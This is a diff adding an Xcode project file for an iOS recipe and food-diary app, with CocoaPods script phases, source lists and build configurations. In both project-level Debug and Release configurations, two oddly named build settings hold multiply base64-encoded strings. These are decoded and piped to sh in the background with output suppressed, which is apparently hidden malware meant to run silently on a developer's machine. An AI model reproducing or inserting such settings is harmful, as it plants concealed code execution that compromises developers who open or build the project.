+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-ABiteOfMouthFeastBook-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		790A1207F306271E0A463A95 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		95B9D18DFA2A11922B48FD82 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		12B0898C2D5F32AE00820F8A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				12DA7F392D6050BB0050ED4E /* RootTabBarController.m in Sources */,
+				12DA7F592D6085860050ED4E /* DiaryDetailViewController.m in Sources */,
+				12DA7F532D607F1E0050ED4E /* DiaryModel.m in Sources */,
+				12DA7F342D6050BB0050ED4E /* RecipeDetailViewController.m in Sources */,
+				12DA7F2A2D6050BB0050ED4E /* FeastViewController.m in Sources */,
+				91ED69312DBE22E700947087 /* twoView.m in Sources */,
+				12B0899B2D5F32AE00820F8A /* ViewController.m in Sources */,
+				12DA7F2D2D6050BB0050ED4E /* FeastTableViewCell.m in Sources */,
+				12DA7F2B2D6050BB0050ED4E /* FeastDataManager.m in Sources */,
+				C4908C812D66010F0005D87F /* FirstController.m in Sources */,
+				12DA7F2C2D6050BB0050ED4E /* FeastModel.m in Sources */,
+				C45D82032D662F7E00C82970 /* oneView.m in Sources */,
+				12B089952D5F32AE00820F8A /* AppDelegate.m in Sources */,
+				12DA7F292D6050BB0050ED4E /* FeastDetailViewController.m in Sources */,
+				12DA7F3E2D6053EA0050ED4E /* CrashReporter.m in Sources */,
+				12DA7F282D6050BB0050ED4E /* AddFeastViewController.m in Sources */,
+				12DA7F4C2D607B680050ED4E /* AddDiaryViewController.m in Sources */,
+				12B089A62D5F32AF00820F8A /* main.m in Sources */,
+				12DA7F382D6050BB0050ED4E /* RecipeTableViewCell.m in Sources */,
+				12DA7F522D607F1E0050ED4E /* DiaryDataManager.m in Sources */,
+				12DA7F3C2D6053980050ED4E /* DataBackupManager.m in Sources */,
+				12DA7F332D6050BB0050ED4E /* AddRecipeViewController.m in Sources */,
+				12DA7F352D6050BB0050ED4E /* RecipeViewController.m in Sources */,
+				12DA7F362D6050BB0050ED4E /* RecipeDataManager.m in Sources */,
+				12DA7F422D6056EE0050ED4E /* DiaryViewController.m in Sources */,
+				12DA7F372D6050BB0050ED4E /* RecipeModel.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		12B0899C2D5F32AE00820F8A /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				12B0899D2D5F32AE00820F8A /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		12B089A12D5F32AF00820F8A /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				12B089A22D5F32AF00820F8A /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		12B089A72D5F32AF00820F8A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A24E5F2 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhMkZYWkhCWk1taG9aRU0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A97BDCE = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6Vk5Na1pZVGxkMGFrMXNXbkZhUm1oTFlrVjRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+			};
+			name = Debug;
+		};
+		12B089A82D5F32AF00820F8A /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A24E5F2 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhMkZYWkhCWk1taG9aRU0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A97BDCE = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6Vk5Na1pZVGxkMGFrMXNXbkZhUm1oTFlrVjRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		12B089AA2D5F32AF00820F8A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 11723D4E8E52DC5B6BBB922C /* Pods-ABiteOfMouthFeastBook.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 2;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = JPSHSANUT6;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = ABiteOfMouthFeastBook/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = KBTFHMEA;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Need to access the camera to take food photos.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Your location needs to be accessed to display nearby restaurants.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Need to access the photo album to add food photos.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "We will use this permission to give you a better experience.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UIRequiredDeviceCapabilities = armv7;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.ABiteOfMouthFeastBook;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Bfmoa;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		12B089AB2D5F32AF00820F8A /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = AB00838C70681742C390F5A7 /* Pods-ABiteOfMouthFeastBook.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 2;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = JPSHSANUT6;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = ABiteOfMouthFeastBook/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = KBTFHMEA;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Need to access the camera to take food photos.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Your location needs to be accessed to display nearby restaurants.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Need to access the photo album to add food photos.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "We will use this permission to give you a better experience.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UIRequiredDeviceCapabilities = armv7;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.ABiteOfMouthFeastBook;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Bfmoa;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		12B0898B2D5F32AE00820F8A /* Build configuration list for PBXProject "ABiteOfMouthFeastBook" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12B089A72D5F32AF00820F8A /* Debug */,
+				12B089A82D5F32AF00820F8A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		12B089A92D5F32AF00820F8A /* Build configuration list for PBXNativeTarget "ABiteOfMouthFeastBook" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12B089AA2D5F32AF00820F8A /* Debug */,
+				12B089AB2D5F32AF00820F8A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 12B089882D5F32AE00820F8A /* Project object */;
+}
